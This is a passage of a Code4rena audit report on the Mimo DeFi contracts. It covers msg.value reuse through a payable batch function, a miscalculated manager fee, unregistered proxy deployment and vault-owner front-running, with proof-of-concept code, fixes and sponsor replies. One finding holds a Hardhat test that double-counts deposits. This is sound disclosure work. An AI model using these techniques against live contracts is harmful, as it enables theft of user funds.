1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Second step: Access control bypass scenario</h4>\n<p>While this is already a high risk and there should be many attacking scenarios I would like to show you a pretty simple one.</p>\n<p>Suppose the owner would like to grant access to a target with a normal function    (maybe no even <code>payable</code>).</p>\n<p>For example   suppose that the owner grant access to the function</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function goodFunction() public </span></span></code></pre>\n<p>This function has the selector  <code>0x0d092393</code> .   However, for some reason. the owner mistyped the selector  and grant access  to non existing function <code>0x0d09392</code>.</p>\n<p>Then if the target contract has the  so common function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">fallback() external payable {  }</span></span></code></pre>\n<p>Then the attacker can drain wallet funds using this selector as I explained above.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The solution is pretty straightforward.</p>\n<p>Remove <code>payable</code>  from <code>batch()</code> in <code>BoringBatchable</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/153#issuecomment-1208687301\">horsefacts (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Agree this is possible. I would note that there is a <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/libraries/BoringBatchable.sol#L8\">big warning</a> at the top of <code>BoringBatchable</code> that links this very blog post.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/153#issuecomment-1210483318\">RayXpub (Mimo) commented</a>:</strong></p>\n<blockquote>\n<p>We are not modifying any state in the <code>MimoProxy</code> based on msg.value, so this doesn’t apply here. Please refer to our test case <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/test/02_integration/MIMOVaultActions.test.ts#L226\">here</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/153#issuecomment-1212105445\">peritoflores (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi @RayXpub .   I found that there is an error in the test case that you mentioned.\nThe test is passing because the contract has no ETH and you call batch with false parameter.</p>\n<p>The second delegatecall is reverting.    However, by design delegatecall  will not revert the main transaction and instead will return false that is ignored in this case.</p>\n<p>To show you this I have created a PoC with a few modification to your original test.\nI just send ETH before and then compared that the amount deposited was double.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">it(&quot;PoC: should be able to reuse msg.value for multiple deposits&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { mimoProxy, vaultActions, vaultsDataProvider, wmatic } = await setup();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">//Send ETH to the proxy RECEIVE EXTERNAL PAYABLE</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const [owner] = await ethers.getSigners();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">owner.sendTransaction({ to: mimoProxy.address, value: DEPOSIT_AMOUNT });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">await mimoProxy.execute(vaultActions.address, vaultActions.interface.encodeFunctionData(&quot;depositETH&quot;), {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  value: DEPOSIT_AMOUNT,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const vaultIdBefore = await vaultsDataProvider.vaultId(wmatic.address, mimoProxy.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const vaultBalanceBefore = await vaultsDataProvider.vaultCollateralBalance(vaultIdBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const data = vaultActions.interface.encodeFunctionData(&quot;depositETH&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">mimoProxy.batch(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mimoProxy.interface.encodeFunctionData(&quot;execute&quot;, [vaultActions.address, data]),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mimoProxy.interface.encodeFunctionData(&quot;execute&quot;, [vaultActions.address, data]),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  true,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  { value: DEPOSIT_AMOUNT },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const vaultId = await vaultsDataProvider.vaultId(wmatic.address, mimoProxy.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const vaultBalanceAfter = await vaultsDataProvider.vaultCollateralBalance(vaultId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">expect(vaultBalanceAfter).to.be.equal(vaultBalanceBefore.add(DEPOSIT_AMOUNT).add(DEPOSIT_AMOUNT));}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">);</span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/153#issuecomment-1213124377\">RayXpub (Mimo) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Hi @peritoflores ,</p>\n<p>Thanks for providing a PoC. It seems we misunderstood the issue as we were looking at it in the context of the miso platform vulnerability described in the paradigm article where it is our understanding that the issue was a <code>msg.value</code> reliant state update. Here ETH are actually transferred in each call. However, for an attacker to be able to call <code>execute()</code> he would need to have been granted permission, so that would rely an approval made by the <code>MIMOProxy</code> owner. </p>\n<p>In the case of the fallback function this would require the owner making a mistake while granting permission by entering an erroneous selector and the target contract would need to have a fallback. </p>\n<p>As we do not see any scenario where this issue would work without a user mistake we consider that this should be labeled as medium risk. But we are considering making all the <code>MIMOProxy</code> functions non payable, this is still being discussed. </p>\n<p>Btw the PoC provided is missing an <code>await</code> on the <code>owner.sendTransaction</code> line which ends up not really showcasing the issue but we did manage to reproduce the scenario.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/153#issuecomment-1221559832\">gzeoneth (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Agree this is not High Risk due to the requirement of owner privilege.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> 👍 Acknowledged</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that calling <code>payable</code> functions via <code>BoringBatchable#batch</code> could lead to double spends or reuse of <code>msg.value</code>.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team have acknowledged the risk of <code>payable</code> calls to <code>BoringBatchable#batch</code>. </p>\n</blockquote>\n<blockquote>\n<p><strong>Acknowledgment:</strong></p>\n<blockquote>\n<p>In no normal usage of the <code>MIMOProxy</code> should there ever be ETH stuck in the contract.<br>\nIn the future, we might need <code>batch</code> to be <code>payable</code>. For example, our main protocol supports calls such as <code>depositETH</code> and <code>depositETHAndBorrow</code>, which we do want to work with the <code>MIMOProxy</code>.</p>\n</blockquote>\n</blockquote>\n<hr>\n<h2 id=\"m-05-mimomanagedrebalancesolrebalance-calculates-managerfee-incorrectly\" style=\"position:relative;\"><a href=\"#m-05-mimomanagedrebalancesolrebalance-calculates-managerfee-incorrectly\" aria-label=\"m 05 mimomanagedrebalancesolrebalance calculates managerfee incorrectly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/34\">[M-05] MIMOManagedRebalance.sol#rebalance calculates managerFee incorrectly</a></h2>\n<p><em>Submitted by 0x52</em></p>\n<p>Inconsistent manager fees could lead to lack of incentivization to rebalance and unexpected liquidation.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 managerFee = managedVault.fixedFee + flData.amount.wadMul(managedVault.varFee);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">IERC20(a.stablex()).safeTransfer(managedVault.manager, managerFee);</span></span></code></pre>\n<p>The variable portion of the fee is calculated using the amount of the flashloan but pays out in PAR. This is problematic because the value of the flashloan asset is constantly fluctuating in value against PAR. This results in an unpredictable fee for both the user and the manager. If the asset drops in price then the user will pay more than they intended. If the asset increases in price then the fee may not be enough to incentivize the manager to call them. The purpose of the managed rebalance is to limit user interaction. If the manager isn’t incentivized to call the vault then the user may be unexpectedly liquidated, resulting in loss of user funds.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>varFee should be calculated against the PAR of the rebalance like it is in MIMOAutoRebalance.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">IPriceFeed priceFeed = a.priceFeed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address fromCollateral = vaultsData.vaultCollateralType(rbData.vaultId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 rebalanceValue = priceFeed.convertFrom(fromCollateral, flData.amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 managerFee = managedVault.fixedFee + rebalanceValue.wadMul(managedVault.varFee);</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/34#issuecomment-1210609570\">RayXpub (Mimo) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge this issue and intend to fix it.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> A warden identified that the variable portion of manager fees in <code>MIMOManagedRebalance</code> was calculated incorrectly, based on the amount of the rebalance flash loan denominated in the collateral asset rather than the amount of the rebalance denominated in PAR.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team updated the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/managed/MIMOManagedRebalance.sol#L61\">fee calculation</a> to calculate the rebalance amount in PAR using a price feed.</p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since the rebalance amount is now denominated in PAR, it no longer fluctuates in terms of the collateral asset.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-proxyfactory-can-circumvent-proxyregistry\" style=\"position:relative;\"><a href=\"#m-06-proxyfactory-can-circumvent-proxyregistry\" aria-label=\"m 06 proxyfactory can circumvent proxyregistry permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/123\">[M-06] ProxyFactory can circumvent ProxyRegistry</a></h2>\n<p><em>Submitted by 0xDjango</em></p>\n<p>The <code>deployFor()</code> function in <code>MIMOProxyFactory.sol</code> can be called directly instead of being called within <code>MIMOProxyRegistry.sol</code>. This results in the ability to create many MIMOProxies that are not registered within the registry. The proxies deployed directly through the factory will lack the ability to call certain actions such as leveraging and emptying the vault, but will be able to call all functions in <code>MIMOVaultAction.sol</code>.</p>\n<p>This inconsistency doesn’t feel natural and would be remedied by adding an <code>onlyRegistry</code> modifier to the <code>ProxyFactory.deployFor()</code> function.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>MIMOProxyFactory.deployFor()</code> lacking any access control:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function deployFor(address owner) public override returns (IMIMOProxy proxy) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    proxy = IMIMOProxy(mimoProxyBase.clone());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    proxy.initialize();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Transfer the ownership from this factory contract to the specified owner.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    proxy.transferOwnership(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Mark the proxy as deployed.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _proxies[address(proxy)] = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Log the proxy via en event.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit DeployProxy(msg.sender, owner, address(proxy));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Example of reduced functionality: <code>MIMOEmptyVault.executeOperation()</code> checks proxy existence in the proxy registry therefore can’t be called.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function executeOperation(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address[] calldata assets,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] calldata amounts,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] calldata premiums,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address initiator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes calldata params</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) external override returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (address owner, uint256 vaultId, SwapData memory swapData) = abi.decode(params, (address, uint256, SwapData));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IMIMOProxy mimoProxy = IMIMOProxy(proxyRegistry.getCurrentProxy(owner));</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Adding access control to ensure that the factory deployFor function is called from the proxy registry would mitigate this issue.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/123#issuecomment-1210553480\">RnkSngh (Mimo) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We confirm this is an issue and intend to implement a fix.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that proxies could be deployed directly from the <code>MIMOProxyFactory</code> without being registered with the <code>MIMOProxyRegistry</code>.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The <code>ProxyRegistry</code> contract has been removed, and registration functionality is now included in <code>MIMOProxyFactory</code>.<br>\nThe <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L47\">only mechanism</a> for deploying a proxy is now to call <code>MIMOProxyFactory#deploy</code>.</p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since there is only one code path to deploy a <code>MIMOProxy</code> and <code>MIMOProxyFactory</code> is the single source of truth for proxy registration, it is no longer possible to deploy an unregistered proxy as described in the finding.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-vaultowner-can-front-run-rebalance-with-setautomation-to-lower-incentives-\" style=\"position:relative;\"><a href=\"#m-07-vaultowner-can-front-run-rebalance-with-setautomation-to-lower-incentives-\" aria-label=\"m 07 vaultowner can front run rebalance with setautomation to lower incentives  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/134\">[M-07] <code>vaultOwner</code> Can Front-Run <code>rebalance()</code> With <code>setAutomation()</code> To Lower Incentives </a></h2>\n<p><em>Submitted by 0xNazgul</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/actions/automated/MIMOAutoAction.sol#L32\">https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/actions/automated/MIMOAutoAction.sol#L32</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/actions/automated/MIMOAutoRebalance.sol#L54\">https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/actions/automated/MIMOAutoRebalance.sol#L54</a></p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A <code>vaultOwner</code> who is “not confident enough in ourselves to stay up-to-date with market conditions to know when we should move to less volatile collateral to avoid liquidations.” They can open their vault to other users who pay attention to the markets and would call <code>rebalance</code> to receive the incentivized fees. The <code>vaultOwner</code> who doesn’t want to pay the baiting high fees instead front-runs the <code>autoRebalance()</code> with <code>setAutomation()</code> to lower incentives.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Mallory, a <code>vaultOwner</code> isn’t confident in staying up-to-date with market conditions. She has her vault setup to be automated and has high fee incentives.</li>\n<li>Alice, a user who is confident in staying up-to-date with market conditions see’s a profitable opportunity and calls <code>rebalance()</code>.</li>\n<li>Mallory is confident in her programing and watching mempools for when <code>rebalance()</code> is called. See’s that Alice just called <code>rebalance()</code> and calls <code>setAutomation()</code> to lower the incentives.</li>\n<li>Alice’s call to <code>rebalance()</code> then goes through getting lower incentives and Mallory then calls <code>setAutomation()</code> to set the incentives back to normal.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a time-lock to <code>setAutomation</code> so that the <code>vaultOwner</code> can’t front-run users.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/134#issuecomment-1210551112\">RnkSngh (Mimo) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We confirm that this is an issue and intend to implement a fix.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> 👍 Acknowledged</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> A warden identified that a malicious vault owner could frontrun automated calls to <code>MIMOAutoRebalance#rebalance</code> and reconfigure their automated vault with a reduced incentive fee.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team have acknowledged the finding.</p>\n</blockquote>\n<blockquote>\n<p><strong>Acknowledgement:</strong></p>\n<blockquote>\n<p>We’ve decided against fixing this in the end.<br>\nThe only potential loser is a keeper/automator that gets frontrun and does not get the reward they thought they would get and thus paid a gas fee that was not covered by the reward. We feel keepers are advanced enough to hide their txs from the mempool and that they’re also smart enough to let the tx revert if it does not yield a profit. For legit users of the protocol this has no impact whatsoever IMO.<br>\nWe also feel a timelock wouldn’t have been enough of a mitigation and might hurt legitimate use of the 